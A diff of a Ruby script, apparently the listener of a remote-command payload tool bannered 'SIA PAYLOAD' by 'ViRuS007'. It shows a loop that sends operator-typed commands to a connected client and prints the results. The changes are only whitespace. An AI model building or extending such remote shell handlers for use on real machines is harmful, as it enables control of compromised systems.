@@ -24,13 +24,13 @@ trap("SIGINT") {
 
 puts """
 
-███████╗██╗ █████╗     ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ 
+███████╗██╗ █████╗     ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗
 ██╔════╝██║██╔══██╗    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗
 ███████╗██║███████║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║
 ╚════██║██║██╔══██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║
 ███████║██║██║  ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝
-╚══════╝╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
-                                                                                 
+╚══════╝╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝
+
                           Coded By ViRuS007
                     Email: virus007@protonmail.com
 
@@ -48,9 +48,11 @@ loop {                          # Servers run forever
     while true
       #if client is disconnected show this message
       puts "#{HC}#{FRED}[*] Client is Offline!#{RS}" if client.closed?
+
       print "\n[+] Enter Command : ".blue
       com = gets.chomp
       client.puts(com)
+      
       puts "\n+------------------------------------------------------------+"
       #res = client.recv(10000).red
       begin
@@ -59,13 +61,14 @@ loop {                          # Servers run forever
           if res == ""
             print "\n[+] Enter Command : ".blue
             com = gets.chomp
-            client.puts(com) 
+            client.puts(com)
           #else
           else
             puts res
           end
           puts "+------------------------------------------------------------+\n"
         end
+
       rescue Timeout::Error
         #print "\n[+] Enter Command : ".blue
         #com = gets.chomp
